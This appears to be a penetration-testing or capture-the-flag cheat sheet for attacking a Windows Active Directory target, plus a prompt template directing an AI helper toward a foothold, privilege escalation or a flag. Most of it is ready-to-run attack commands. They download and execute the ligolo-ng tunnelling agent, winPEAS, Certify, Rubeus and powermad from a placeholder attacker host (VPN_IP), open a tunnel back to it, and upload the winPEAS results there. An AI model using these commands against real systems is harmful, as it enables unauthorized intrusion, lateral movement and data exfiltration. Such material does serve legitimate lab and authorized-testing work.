```sh

# ligolo-ng -selfcert
curl http://VPN_IP:6789/windows/ligolo-ng/agent.exe -o C:\Windows\Tasks\agent.exe
Start-Process "C:\windows\tasks\agent.exe" -Argumentlist "-connect VPN_IP:11601 -ignore-cert"

# ligolo-ng »
session # select tunnel session
interface_create --name hi
tunnel_start --tun hi
interface_add_route --name hi --route 240.0.0.1/32
interface_add_route --name hi --route 172.16.16.0/24

# winPEASany.exe
curl http://VPN_IP:6789/windows/winPEAS/winPEASany.exe -o C:\windows\tasks\wp.exe; cd C:\windows\tasks; C:\windows\tasks\wp.exe | Tee-Object -FilePath "winpeas.txt"
curl.exe -T C:\windows\tasks\winpeas.txt http://VPN_IP/

# Certify.exe
curl http://VPN_IP:6789/windows/SharpCollection/NetFramework_4.7_x64/Certify.exe -o C:\windows\tasks\Certify.exe; cd C:\windows\tasks; C:\windows\tasks\Certify.exe find | Tee-Object -FilePath "cert.txt"

# Rubeus.exe
curl http://VPN_IP:6789/windows/SharpCollection/NetFramework_4.7_x64/Rubeus.exe -o C:\windows\tasks\Rubeus.exe

# cp /opt/tools/Empire/empire/server/data/module_source/situational_awareness/network/powermad.ps1 /workspace
curl http://VPN_IP/powermad.ps1 -o C:\windows\tasks\powermad.ps1

# nxc kerberos config
nxc smb "DC.DOMAIN_SLUG" -u "$USER" -p "$PASSWORD" -k --generate-krb5-file krb5.conf

# set DC_HOST, DC_IP, and DOMAIN
/opt/my-resources/bin/hostnamer.sh TARGET_IP DC01.DOMAIN_SLUG -dc

```
```js

- Target: TARGET_IP CHALLENGE_SLUG
- Recon output: `/workspace/results/*/scans`. Please read _full_tcp_nmap.txt + _errors.log first.
- Goal: <foothold|privesc|flag>.

- Before suggesting steps, mine: _full_tcp_nmap.txt + _errors.log, newest artifacts in /workspace/tmp/, our commands in /root/.zsh_history after "YOUR COMMANDS BELOW", and Burp proxy history via burp-mcp (active editor or scoped history for the right host:port).
